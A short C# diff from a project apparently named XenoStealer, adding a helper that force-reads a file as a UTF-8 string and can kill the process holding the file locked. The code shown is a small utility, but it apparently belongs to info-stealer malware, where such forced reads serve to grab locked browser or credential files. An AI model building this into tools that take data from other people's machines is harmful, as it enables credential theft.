@@ -13,6 +13,23 @@ namespace XenoStealer
     public static class Utils
     {
 
+        public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
+        {
+            byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
+            if (fileContent == null) 
+            {
+                return null;
+            }
+            try 
+            {
+                return Encoding.UTF8.GetString(fileContent);
+            } 
+            catch 
+            { 
+            }
+            return null;
+        }
+
         public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire=false)
         {
             try 
